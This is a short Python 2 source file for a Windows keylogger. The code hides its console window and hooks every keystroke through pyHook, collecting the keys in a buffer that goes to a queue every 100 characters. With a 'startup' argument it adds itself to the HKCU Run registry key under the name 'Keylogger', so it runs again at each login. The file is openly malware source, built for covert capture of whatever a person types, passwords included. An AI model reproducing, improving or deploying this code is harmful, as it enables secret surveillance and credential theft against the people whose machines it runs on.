from Queue import Queue
try:
    import pythoncom, pyHook
except ImportError:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import win32event, win32api, winerror
from _winreg import *
from win32com.shell.shell import ShellExecuteEx


# Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)

messages_queue = Queue()
tmp = ''


def hide():
    import win32console, win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


# Add to startup
def add_startup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp+"\\"+file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)

    SetValueEx(key2change, "Keylogger", 0, REG_SZ, new_file_path)


def main():
    if len(sys.argv) == 1:
        exit(0)
    else:
        if len(sys.argv) > 2:
            if sys.argv[2] == "startup":
                add_startup()
            else:
                exit(0)
        hide()
    return True

if __name__ == '__main__':
    main()


def on_key_press(event):
    global tmp
    if event.Ascii == 13:
        keys = '<ENTER>'
    elif event.Ascii == 8:
        keys = '<BACK SPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    else:
        keys = chr(event.Ascii)
    tmp = tmp + keys
    if len(tmp) > 100:
        messages_queue.put(tmp)
        tmp = ''

obj = pyHook.HookManager()
obj.KeyDown = on_key_press
obj.HookKeyboard()
pythoncom.PumpMessages()
